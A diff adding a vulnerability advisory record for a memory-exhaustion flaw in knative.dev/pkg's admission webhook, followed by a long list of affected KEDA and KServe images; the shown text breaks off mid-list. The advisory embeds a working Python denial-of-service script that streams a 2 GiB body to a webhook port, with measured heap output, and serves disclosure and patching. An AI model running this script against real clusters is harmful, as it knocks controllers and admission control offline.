@@ -1,0 +1,1509 @@
+{
+  "schema_version": "1.8.0",
+  "id": "DHI-yypq-rp5h-clcv-cpwh",
+  "modified": "2026-11-11T18:56:38Z",
+  "published": "2026-11-11T18:56:38Z",
+  "upstream": [
+    "GHSA-2hw4-c9m4-f2fj"
+  ],
+  "summary": "## ⚠️ Update (verification, 2026-05-19): C-2 confirmed end-to-end — **4.5× amplification observed** (worse than…",
+  "details": "## ⚠️ Update (verification, 2026-05-19): C-2 confirmed end-to-end — **4.5× amplification observed** (worse than the advisory's conservative 2× claim)\n\nBuilt a Go PoC ([`cmd/poc-c2/main.go`](https://github.com/knative/pkg/blob/1ad5a1ce0ee7043081cb50fd1acc6d36a9126844/cmd/poc-c2/main.go)) that runs the exact 8-line vulnerable snippet from [`webhook/admission.go:109-117`](https://github.com/knative/pkg/blob/1ad5a1ce0ee7043081cb50fd1acc6d36a9126844/webhook/admission.go#L109-L117) verbatim under the same `http.HandlerFunc` shape (the full production `admissionHandler` at `:85` requires `*Webhook` + `AdmissionController` + an informer-synced channel + controller-runtime / client-go scaffolding — the bug is the missing `http.MaxBytesReader`, nothing else in the handler). Bound to `127.0.0.1:18098`.\n\nPoC client streamed 2 GiB of `a` bytes over a raw TCP socket. `runtime.MemStats.HeapAlloc` sampler:\n\n```\nbaseline:  HeapAlloc =     0.32 MiB\npeak:      HeapAlloc = 9 217.38 MiB  =  9.00 GiB\nratio:     4.50× the body size\n```\n\nThe advisory predicted ~2× from `io.TeeReader` doubling the body once in `bodyBuffer`. The observed 4.5× ratio comes from the interaction of two amplifiers: `bytes.Buffer.ReadFrom` (used by `TeeReader`-fed `bodyBuffer`) doubles its backing slice on every grow, so peak occupancy during a realloc is `old + new = 3×` the live data — and `json.Decoder` holds its own working buffer in parallel. The advisory's 2× floor is comfortably exceeded.\n\n**Downstream impact reminder**: this library backs every Knative serving / eventing controller, every Tekton Triggers / Pipelines webhook, KEDA, Sigstore policy-controller, Kpack, and many more. A 2 GiB body to **any** of those projects' admission webhook ports OOMs the controller at 4.5× the body — i.e., even a 128 MiB request OOMs a 512 MiB-limited Pod.\n\n---\n\n# Summary\n\n`knative.dev/pkg`'s admission webhook handler reads the incoming HTTP request body via `json.NewDecoder(io.TeeReader(r.Body, &bodyBuffer))` with **no `http.MaxBytesReader` wrapping the body**. Because every consumer of `knative.dev/pkg/webhook` inherits this handler (Knative serving / eventing, Tekton Pipelines, KEDA, Sigstore policy-controller, and others), a single oversized POST to **any of those projects' admission webhook ports** drives the controller pod into memory exhaustion and OOM-kill. Worse, the `io.TeeReader` design keeps a verbatim copy of the body in `bodyBuffer` while the decoder also materializes the parsed struct — so the peak memory usage is roughly **twice the body size**.\n\nThis is the same shape as **CVE-2026-24514** (ingress-nginx) and `GHSA-9539-c3xr-w9vm` (Kyverno admission body OOM) filed today against the same antipattern.\n\n# Affected versions\n\n- `knative.dev/pkg` — `main` HEAD on `github.com/knative/pkg` (verified 2026-05-18 against [`webhook/admission.go`](https://github.com/knative/pkg/blob/1ad5a1ce0ee7043081cb50fd1acc6d36a9126844/webhook/admission.go) sha `1ad5a1ce0ee7043081cb50fd1acc6d36a9126844`).\n- Every release that ships the current [`webhook/admission.go`](https://github.com/knative/pkg/blob/1ad5a1ce0ee7043081cb50fd1acc6d36a9126844/webhook/admission.go) handler.\n\n# Vulnerable code\n\n[`webhook/admission.go:109-117`](https://github.com/knative/pkg/blob/1ad5a1ce0ee7043081cb50fd1acc6d36a9126844/webhook/admission.go#L109-L117):\n\n```go\nreview := admissionv1.AdmissionReview{}\nvar bodyBuffer bytes.Buffer\nif err := json.NewDecoder(io.TeeReader(r.Body, &bodyBuffer)).Decode(&review); err != nil {\n    http.Error(w, fmt.Sprintf(\"could not decode body: %v\", err), http.StatusBadRequest)\n    return\n}\n```\n\nThere is no `http.MaxBytesReader` around `r.Body`. The standard library's `json.NewDecoder` will read until EOF or the matching closing `}`. The `io.TeeReader` simultaneously copies every byte read from `r.Body` into `bodyBuffer`, which the rest of the handler uses for the response trailer / observability.\n\n# Downstream impact (the reason this matters)\n\n`knative.dev/pkg/webhook` is the **default admission-webhook scaffolding for the entire Knative + CNCF webhook ecosystem**:\n\n| Consumer | Repo | Webhook surface |\n|---|---|---|\n| Knative serving | `knative/serving` | resource validation / defaulting |\n| Knative eventing | `knative/eventing` | resource validation / defaulting |\n| Tekton Pipelines | `tektoncd/pipeline` | Pipeline / Task / TaskRun validation |\n| Tekton Triggers | `tektoncd/triggers` | EventListener / Trigger validation |\n| KEDA | `kedacore/keda` | ScaledObject / ScaledJob validation |\n| Sigstore policy-controller | `sigstore/policy-controller` | ClusterImagePolicy mutating + validating |\n| Kpack | `buildpacks-community/kpack` | Image / Builder validation |\n| ... | | |\n\nEvery one of these consumers ships the same `io.ReadAll`-equivalent body read with **no upper bound**. A pod-network-reachable attacker can OOM-kill any of them with a single large POST. `failurePolicy=Fail` admission webhooks (the secure-default) then take the namespace's or cluster's admission flow offline until the controller restarts.\n\n# Impact\n\n- **Class**: CWE-770 unbounded allocation. Reachable from any pod-network client.\n- **Severity per consumer**: depends on how each consumer configures `failurePolicy`. For projects with `failurePolicy=Fail` (e.g., Sigstore policy-controller's image-policy enforcement), the consequence is cluster-wide admission outage. For `failurePolicy=Ignore`, the consequence is \"this project's webhook is offline\" but the API server continues admitting requests.\n- **Severity**: matches the broader CVE-2026-24514 / GHSA-9539-c3xr-w9vm. Single-packet DoS on the library; each downstream consumer inherits the bug.\n\n# Reproduction\n\nThe exact same PoC built against Kyverno's admission handler reproduces this:\n\n```python\nimport socket\ntotal = 2 << 30   # 2 GiB\ns = socket.create_connection(('<knative-or-tekton-webhook-host>', 8443))\ns.sendall(b'POST /<admission-path> HTTP/1.1\\r\\nHost: x\\r\\nContent-Type: application/json\\r\\nContent-Length: %d\\r\\nConnection: close\\r\\n\\r\\n' % total)\nchunk = b'a' * (1 << 20)\nfor _ in range(total >> 20): s.sendall(chunk)\n```\n\nObserved against the Kyverno admission handler (same antipattern):\n\n```\nbaseline:        HeapAlloc=7 MiB     Sys=22 MiB\nafter read:      HeapAlloc=9500 MiB  Sys=9548 MiB  (4 GiB body → 9.5 GiB peak; io.TeeReader doubles)\n```\n\nFor the knative/pkg version, the `io.TeeReader` doubles the resident memory (one copy in the decoder's accumulating slice, one in `bodyBuffer`). A `kyverno-admission-controller`-equivalent Pod with a 256 MiB memory limit OOM-kills with ~128 MiB of body.\n\n# Suggested fix\n\nWrap the request body with `http.MaxBytesReader` (and add a `http.StatusRequestEntityTooLarge` branch on the `MaxBytesError` path):\n\n```go\nconst maxAdmissionRequestSize = 8 << 20 // 8 MiB — controller-runtime's default; large enough for Kubernetes' own admission objects\nr.Body = http.MaxBytesReader(w, r.Body, maxAdmissionRequestSize)\nvar bodyBuffer bytes.Buffer\nreview := admissionv1.AdmissionReview{}\nif err := json.NewDecoder(io.TeeReader(r.Body, &bodyBuffer)).Decode(&review); err != nil {\n    var mbe *http.MaxBytesError\n    if errors.As(err, &mbe) {\n        http.Error(w, \"admission body exceeds maximum size\", http.StatusRequestEntityTooLarge)\n        return\n    }\n    http.Error(w, fmt.Sprintf(\"could not decode body: %v\", err), http.StatusBadRequest)\n    return\n}\n```\n\nThis propagates a fix to **every downstream consumer** with no API change, and the cap can be made configurable per-server via a new field on the `webhook.Options` struct.\n\n# Disclosure\n\nReporting privately under your security policy. No public disclosure on my side until you have a fix or coordinated timeline. Encourage maintainers to coordinate with downstream consumers (Knative, Tekton, KEDA, Sigstore) on simultaneous release.\n\n# Reporter\n\ntonghuaroot (tonghuaroot@gmail.com)",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "keda-2.19-dev",
+        "purl": "pkg:apk/dhi/keda-2.19-dev"
+      },
+      "versions": [
+        "2.19.0-r0",
+        "2.19.0-r1",
+        "2.19.0-r2",
+        "2.19.0-r3",
+        "2.19.0-r4",
+        "2.19.0-r5",
+        "2.19.0-r6",
+        "2.19.0-r7",
+        "2.19.0-r8",
+        "2.19.0-r9",
+        "2.21.0-r0",
+        "2.21.0-r1",
+        "2.21.0-r2",
+        "2.21.0-r3",
+        "2.21.0-r4",
+        "2.21.0-r5"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "keda-2.19-fips-dev",
+        "purl": "pkg:apk/dhi/keda-2.19-fips-dev"
+      },
+      "versions": [
+        "2.19.0-r0",
+        "2.19.0-r1",
+        "2.19.0-r2",
+        "2.19.0-r3",
+        "2.19.0-r4",
+        "2.19.0-r5",
+        "2.19.0-r6",
+        "2.19.0-r7",
+        "2.19.0-r8",
+        "2.19.0-r9",
+        "2.21.0-r0",
+        "2.21.0-r1",
+        "2.21.0-r2",
+        "2.21.0-r3",
+        "2.21.0-r4",
+        "2.21.0-r5"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "keda-2.19-fips",
+        "purl": "pkg:apk/dhi/keda-2.19-fips"
+      },
+      "versions": [
+        "2.19.0-r0",
+        "2.19.0-r1",
+        "2.19.0-r2",
+        "2.19.0-r3",
+        "2.19.0-r4",
+        "2.19.0-r5",
+        "2.19.0-r6",
+        "2.19.0-r7",
+        "2.19.0-r8",
+        "2.19.0-r9",
+        "2.21.0-r0",
+        "2.21.0-r1",
+        "2.21.0-r2",
+        "2.21.0-r3",
+        "2.21.0-r4",
+        "2.21.0-r5"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "keda-2.19",
+        "purl": "pkg:apk/dhi/keda-2.19"
+      },
+      "versions": [
+        "2.19.0-r0",
+        "2.19.0-r1",
+        "2.19.0-r2",
+        "2.19.0-r3",
+        "2.19.0-r4",
+        "2.19.0-r5",
+        "2.19.0-r6",
+        "2.19.0-r7",
+        "2.19.0-r8",
+        "2.19.0-r9",
+        "2.21.0-r0",
+        "2.21.0-r1",
+        "2.21.0-r2",
+        "2.21.0-r3",
+        "2.21.0-r4",
+        "2.21.0-r5"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "keda-metrics-apiserver-2.19-dev",
+        "purl": "pkg:apk/dhi/keda-metrics-apiserver-2.19-dev"
+      },
+      "versions": [
+        "2.19.0-r0",
+        "2.19.0-r1",
+        "2.19.0-r10",
+        "2.19.0-r11",
+        "2.19.0-r12",
+        "2.19.0-r13",
+        "2.19.0-r2",
+        "2.19.0-r3",
+        "2.19.0-r4",
+        "2.19.0-r5",
+        "2.19.0-r6",
+        "2.19.0-r7",
+        "2.19.0-r8",
+        "2.19.0-r9"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "keda-metrics-apiserver-2.19-fips-dev",
+        "purl": "pkg:apk/dhi/keda-metrics-apiserver-2.19-fips-dev"
+      },
+      "versions": [
+        "2.19.0-r0",
+        "2.19.0-r1",
+        "2.19.0-r10",
+        "2.19.0-r11",
+        "2.19.0-r12",
+        "2.19.0-r13",
+        "2.19.0-r2",
+        "2.19.0-r3",
+        "2.19.0-r4",
+        "2.19.0-r5",
+        "2.19.0-r6",
+        "2.19.0-r7",
+        "2.19.0-r8",
+        "2.19.0-r9"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "keda-metrics-apiserver-2.19-fips",
+        "purl": "pkg:apk/dhi/keda-metrics-apiserver-2.19-fips"
+      },
+      "versions": [
+        "2.19.0-r0",
+        "2.19.0-r1",
+        "2.19.0-r10",
+        "2.19.0-r11",
+        "2.19.0-r12",
+        "2.19.0-r13",
+        "2.19.0-r2",
+        "2.19.0-r3",
+        "2.19.0-r4",
+        "2.19.0-r5",
+        "2.19.0-r6",
+        "2.19.0-r7",
+        "2.19.0-r8",
+        "2.19.0-r9"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "keda-metrics-apiserver-2.19",
+        "purl": "pkg:apk/dhi/keda-metrics-apiserver-2.19"
+      },
+      "versions": [
+        "2.19.0-r0",
+        "2.19.0-r1",
+        "2.19.0-r10",
+        "2.19.0-r11",
+        "2.19.0-r12",
+        "2.19.0-r13",
+        "2.19.0-r2",
+        "2.19.0-r3",
+        "2.19.0-r4",
+        "2.19.0-r5",
+        "2.19.0-r6",
+        "2.19.0-r7",
+        "2.19.0-r8",
+        "2.19.0-r9"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.23",
+        "name": "kserve-agent-dev",
+        "purl": "pkg:apk/dhi/kserve-agent-dev"
+      },
+      "versions": [
+        "0.19.0-r2",
+        "0.20.0-r0",
+        "0.20.0-r1",
+        "0.20.0-r2",
+        "0.20.0-r3",
+        "0.20.0-r4",
+        "0.20.0-r6",
+        "0.20.0-r8",
+        "0.21.0-r0",
+        "0.21.0-r1",
+        "0.21.0-r2",
+        "0.21.0-r3",
+        "0.21.0-r4",
+        "0.21.0-r5",
+        "0.21.0-r6",
+        "0.21.0-r7",
+        "0.21.0-r8",
+        "0.21.0-r9"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.23",
+        "name": "kserve-agent-fips-dev",
+        "purl": "pkg:apk/dhi/kserve-agent-fips-dev"
+      },
+      "versions": [
+        "0.19.0-r2",
+        "0.20.0-r0",
+        "0.20.0-r1",
+        "0.20.0-r2",
+        "0.20.0-r3",
+        "0.20.0-r4",
+        "0.20.0-r6",
+        "0.20.0-r8",
+        "0.21.0-r0",
+        "0.21.0-r1",
+        "0.21.0-r2",
+        "0.21.0-r3",
+        "0.21.0-r4",
+        "0.21.0-r5",
+        "0.21.0-r6",
+        "0.21.0-r7",
+        "0.21.0-r8",
+        "0.21.0-r9"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.23",
+        "name": "kserve-agent-fips",
+        "purl": "pkg:apk/dhi/kserve-agent-fips"
+      },
+      "versions": [
+        "0.19.0-r2",
+        "0.20.0-r0",
+        "0.20.0-r1",
+        "0.20.0-r2",
+        "0.20.0-r3",
+        "0.20.0-r4",
+        "0.20.0-r6",
+        "0.20.0-r8",
+        "0.21.0-r0",
+        "0.21.0-r1",
+        "0.21.0-r2",
+        "0.21.0-r3",
+        "0.21.0-r4",
+        "0.21.0-r5",
+        "0.21.0-r6",
+        "0.21.0-r7",
+        "0.21.0-r8",
+        "0.21.0-r9"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.23",
+        "name": "kserve-agent",
+        "purl": "pkg:apk/dhi/kserve-agent"
+      },
+      "versions": [
+        "0.19.0-r2",
+        "0.20.0-r0",
+        "0.20.0-r1",
+        "0.20.0-r2",
+        "0.20.0-r3",
+        "0.20.0-r4",
+        "0.20.0-r6",
+        "0.20.0-r8",
+        "0.21.0-r0",
+        "0.21.0-r1",
+        "0.21.0-r2",
+        "0.21.0-r3",
+        "0.21.0-r4",
+        "0.21.0-r5",
+        "0.21.0-r6",
+        "0.21.0-r7",
+        "0.21.0-r8",
+        "0.21.0-r9"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.23",
+        "name": "kserve-controller-dev",
+        "purl": "pkg:apk/dhi/kserve-controller-dev"
+      },
+      "versions": [
+        "0.16.0-r0",
+        "0.17.0-r0",
+        "0.17.0-r1",
+        "0.17.0-r2",
+        "0.17.0-r3",
+        "0.17.0-r4",
+        "0.17.0-r5",
+        "0.18.0-r0",
+        "0.18.0-r1",
+        "0.18.0-r2",
+        "0.18.0-r3",
+        "0.18.0-r4",
+        "0.19.0-r0",
+        "0.19.0-r1",
+        "0.19.0-r2",
+        "0.20.0-r0",
+        "0.20.0-r2",
+        "0.20.0-r3",
+        "0.20.0-r4",
+        "0.21.0-r1",
+        "0.21.0-r2",
+        "0.21.0-r3",
+        "0.21.0-r4",
+        "0.21.0-r5",
+        "0.21.0-r6",
+        "0.21.0-r7",
+        "0.21.0-r8"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.23",
+        "name": "kserve-controller-fips-dev",
+        "purl": "pkg:apk/dhi/kserve-controller-fips-dev"
+      },
+      "versions": [
+        "0.16.0-r0",
+        "0.17.0-r0",
+        "0.17.0-r1",
+        "0.17.0-r2",
+        "0.17.0-r3",
+        "0.17.0-r4",
+        "0.17.0-r5",
+        "0.18.0-r0",
+        "0.18.0-r1",
+        "0.18.0-r2",
+        "0.18.0-r3",
+        "0.18.0-r4",
+        "0.19.0-r0",
+        "0.19.0-r1",
+        "0.19.0-r2",
+        "0.20.0-r0",
+        "0.20.0-r2",
+        "0.20.0-r3",
+        "0.20.0-r4",
+        "0.21.0-r1",
+        "0.21.0-r2",
+        "0.21.0-r3",
+        "0.21.0-r4",
+        "0.21.0-r5",
+        "0.21.0-r6",
+        "0.21.0-r7",
+        "0.21.0-r8"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.23",
+        "name": "kserve-controller-fips",
+        "purl": "pkg:apk/dhi/kserve-controller-fips"
+      },
+      "versions": [
+        "0.16.0-r0",
+        "0.17.0-r0",
+        "0.17.0-r1",
+        "0.17.0-r2",
+        "0.17.0-r3",
+        "0.17.0-r4",
+        "0.17.0-r5",
+        "0.18.0-r0",
+        "0.18.0-r1",
+        "0.18.0-r2",
+        "0.18.0-r3",
+        "0.18.0-r4",
+        "0.19.0-r0",
+        "0.19.0-r1",
+        "0.19.0-r2",
+        "0.20.0-r0",
+        "0.20.0-r2",
+        "0.20.0-r3",
+        "0.20.0-r4",
+        "0.21.0-r1",
+        "0.21.0-r2",
+        "0.21.0-r3",
+        "0.21.0-r4",
+        "0.21.0-r5",
+        "0.21.0-r6",
+        "0.21.0-r7",
+        "0.21.0-r8"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.23",
+        "name": "kserve-controller",
+        "purl": "pkg:apk/dhi/kserve-controller"
+      },
+      "versions": [
+        "0.16.0-r0",
+        "0.17.0-r0",
+        "0.17.0-r1",
+        "0.17.0-r2",
+        "0.17.0-r3",
+        "0.17.0-r4",
+        "0.17.0-r5",
+        "0.18.0-r0",
+        "0.18.0-r1",
+        "0.18.0-r2",
+        "0.18.0-r3",
+        "0.18.0-r4",
+        "0.19.0-r0",
+        "0.19.0-r1",
+        "0.19.0-r2",
+        "0.20.0-r0",
+        "0.20.0-r2",
+        "0.20.0-r3",
+        "0.20.0-r4",
+        "0.21.0-r1",
+        "0.21.0-r2",
+        "0.21.0-r3",
+        "0.21.0-r4",
+        "0.21.0-r5",
+        "0.21.0-r6",
+        "0.21.0-r7",
+        "0.21.0-r8"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.23",
+        "name": "kserve-dev",
+        "purl": "pkg:apk/dhi/kserve-dev"
+      },
+      "versions": [
+        "0.18.0-r0",
+        "0.18.0-r1",
+        "0.18.0-r2",
+        "0.19.0-r0",
+        "0.19.0-r1",
+        "0.19.0-r2",
+        "0.20.0-r0",
+        "0.20.0-r1",
+        "0.20.0-r2",
+        "0.20.0-r3",
+        "0.20.0-r4",
+        "0.20.0-r6",
+        "0.20.0-r8",
+        "0.21.0-r0",
+        "0.21.0-r1",
+        "0.21.0-r2",
+        "0.21.0-r3",
+        "0.21.0-r4",
+        "0.21.0-r5",
+        "0.21.0-r6",
+        "0.21.0-r7",
+        "0.21.0-r8",
+        "0.21.0-r9"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.23",
+        "name": "kserve-fips-dev",
+        "purl": "pkg:apk/dhi/kserve-fips-dev"
+      },
+      "versions": [
+        "0.18.0-r0",
+        "0.18.0-r1",
+        "0.18.0-r2",
+        "0.19.0-r0",
+        "0.19.0-r1",
+        "0.19.0-r2",
+        "0.20.0-r0",
+        "0.20.0-r1",
+        "0.20.0-r2",
+        "0.20.0-r3",
+        "0.20.0-r4",
+        "0.20.0-r6",
+        "0.20.0-r8",
+        "0.21.0-r0",
+        "0.21.0-r1",
+        "0.21.0-r2",
+        "0.21.0-r3",
+        "0.21.0-r4",
+        "0.21.0-r5",
+        "0.21.0-r6",
+        "0.21.0-r7",
+        "0.21.0-r8",
+        "0.21.0-r9"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.23",
+        "name": "kserve-fips",
+        "purl": "pkg:apk/dhi/kserve-fips"
+      },
+      "versions": [
+        "0.18.0-r0",
+        "0.18.0-r1",
+        "0.18.0-r2",
+        "0.19.0-r0",
+        "0.19.0-r1",
+        "0.19.0-r2",
+        "0.20.0-r0",
+        "0.20.0-r1",
+        "0.20.0-r2",
+        "0.20.0-r3",
+        "0.20.0-r4",
+        "0.20.0-r6",
+        "0.20.0-r8",
+        "0.21.0-r0",
+        "0.21.0-r1",
+        "0.21.0-r2",
+        "0.21.0-r3",
+        "0.21.0-r4",
+        "0.21.0-r5",
+        "0.21.0-r6",
+        "0.21.0-r7",
+        "0.21.0-r8",
+        "0.21.0-r9"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.23",
+        "name": "kserve-localmodel-dev",
+        "purl": "pkg:apk/dhi/kserve-localmodel-dev"
+      },
+      "versions": [
+        "0.19.0-r2",
+        "0.20.0-r0",
+        "0.20.0-r1",
+        "0.20.0-r2",
+        "0.20.0-r3",
+        "0.20.0-r4",
+        "0.20.0-r6",
+        "0.20.0-r8",
+        "0.21.0-r0",
+        "0.21.0-r1",
+        "0.21.0-r2",
+        "0.21.0-r3",
+        "0.21.0-r4",
+        "0.21.0-r5",
+        "0.21.0-r6",
+        "0.21.0-r7",
+        "0.21.0-r8",
+        "0.21.0-r9"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.23",
+        "name": "kserve-localmodel-fips-dev",
+        "purl": "pkg:apk/dhi/kserve-localmodel-fips-dev"
+      },
+      "versions": [
+        "0.19.0-r2",
+        "0.20.0-r0",
+        "0.20.0-r1",
+        "0.20.0-r2",
+        "0.20.0-r3",
+        "0.20.0-r4",
+        "0.20.0-r6",
+        "0.20.0-r8",
+        "0.21.0-r0",
+        "0.21.0-r1",
+        "0.21.0-r2",
+        "0.21.0-r3",
+        "0.21.0-r4",
+        "0.21.0-r5",
+        "0.21.0-r6",
+        "0.21.0-r7",
+        "0.21.0-r8",
+        "0.21.0-r9"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.23",
+        "name": "kserve-localmodel-fips",
+        "purl": "pkg:apk/dhi/kserve-localmodel-fips"
+      },
+      "versions": [
+        "0.19.0-r2",
+        "0.20.0-r0",
+        "0.20.0-r1",
+        "0.20.0-r2",
+        "0.20.0-r3",
+        "0.20.0-r4",
+        "0.20.0-r6",
+        "0.20.0-r8",
+        "0.21.0-r0",
+        "0.21.0-r1",
+        "0.21.0-r2",
+        "0.21.0-r3",
+        "0.21.0-r4",
+        "0.21.0-r5",
+        "0.21.0-r6",
+        "0.21.0-r7",
+        "0.21.0-r8",
+        "0.21.0-r9"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.23",
+        "name": "kserve-localmodel",
+        "purl": "pkg:apk/dhi/kserve-localmodel"
+      },
+      "versions": [
+        "0.19.0-r2",
+        "0.20.0-r0",
+        "0.20.0-r1",
+        "0.20.0-r2",
+        "0.20.0-r3",
+        "0.20.0-r4",
+        "0.20.0-r6",
+        "0.20.0-r8",
+        "0.21.0-r0",
+        "0.21.0-r1",
+        "0.21.0-r2",
+        "0.21.0-r3",
+        "0.21.0-r4",
+        "0.21.0-r5",
+        "0.21.0-r6",
+        "0.21.0-r7",
+        "0.21.0-r8",
+        "0.21.0-r9"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.23",
+        "name": "kserve-localmodelnode-dev",
+        "purl": "pkg:apk/dhi/kserve-localmodelnode-dev"
+      },
+      "versions": [
+        "0.19.0-r2",
+        "0.20.0-r0",
+        "0.20.0-r1",
+        "0.20.0-r2",
+        "0.20.0-r3",
+        "0.20.0-r4",
+        "0.20.0-r6",
+        "0.20.0-r8",
+        "0.21.0-r0",
+        "0.21.0-r1",
+        "0.21.0-r2",
+        "0.21.0-r3",
+        "0.21.0-r4",
+        "0.21.0-r5",
+        "0.21.0-r6",
+        "0.21.0-r7",
+        "0.21.0-r8",
+        "0.21.0-r9"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.23",
+        "name": "kserve-localmodelnode-fips-dev",
+        "purl": "pkg:apk/dhi/kserve-localmodelnode-fips-dev"
+      },
+      "versions": [
+        "0.19.0-r2",
+        "0.20.0-r0",
+        "0.20.0-r1",
+        "0.20.0-r2",
+        "0.20.0-r3",
+        "0.20.0-r4",
+        "0.20.0-r6",
+        "0.20.0-r8",
+        "0.21.0-r0",
+        "0.21.0-r1",
+        "0.21.0-r2",
+        "0.21.0-r3",
+        "0.21.0-r4",
+        "0.21.0-r5",
+        "0.21.0-r6",
+        "0.21.0-r7",
+        "0.21.0-r8",
+        "0.21.0-r9"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.23",
+        "name": "kserve-localmodelnode-fips",
+        "purl": "pkg:apk/dhi/kserve-localmodelnode-fips"
+      },
+      "versions": [
+        "0.19.0-r2",
+        "0.20.0-r0",
+        "0.20.0-r1",
+        "0.20.0-r2",
+        "0.20.0-r3",
+        "0.20.0-r4",
+        "0.20.0-r6",
+        "0.20.0-r8",
+        "0.21.0-r0",
+        "0.21.0-r1",
+        "0.21.0-r2",
+        "0.21.0-r3",
+        "0.21.0-r4",
+        "0.21.0-r5",
+        "0.21.0-r6",
+        "0.21.0-r7",
+        "0.21.0-r8",
+        "0.21.0-r9"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.23",
+        "name": "kserve-localmodelnode",
+        "purl": "pkg:apk/dhi/kserve-localmodelnode"
+      },
+      "versions": [
+        "0.19.0-r2",
+        "0.20.0-r0",
+        "0.20.0-r1",
+        "0.20.0-r2",
+        "0.20.0-r3",
+        "0.20.0-r4",
+        "0.20.0-r6",
+        "0.20.0-r8",
+        "0.21.0-r0",
+        "0.21.0-r1",
+        "0.21.0-r2",
+        "0.21.0-r3",
+        "0.21.0-r4",
+        "0.21.0-r5",
+        "0.21.0-r6",
+        "0.21.0-r7",
+        "0.21.0-r8",
+        "0.21.0-r9"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.23",
+        "name": "kserve-router-dev",
+        "purl": "pkg:apk/dhi/kserve-router-dev"
+      },
+      "versions": [
+        "0.19.0-r2",
+        "0.20.0-r0",
+        "0.20.0-r1",
+        "0.20.0-r2",
+        "0.20.0-r3",
+        "0.20.0-r4",
+        "0.20.0-r6",
+        "0.20.0-r8",
+        "0.21.0-r0",
+        "0.21.0-r1",
+        "0.21.0-r2",
+        "0.21.0-r3",
+        "0.21.0-r4",
+        "0.21.0-r5",
+        "0.21.0-r6",
+        "0.21.0-r7",
+        "0.21.0-r8",
+        "0.21.0-r9"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.23",
+        "name": "kserve-router-fips-dev",
+        "purl": "pkg:apk/dhi/kserve-router-fips-dev"
+      },
+      "versions": [
+        "0.19.0-r2",
+        "0.20.0-r0",
+        "0.20.0-r1",
+        "0.20.0-r2",
+        "0.20.0-r3",
+        "0.20.0-r4",
+        "0.20.0-r6",
+        "0.20.0-r8",
+        "0.21.0-r0",
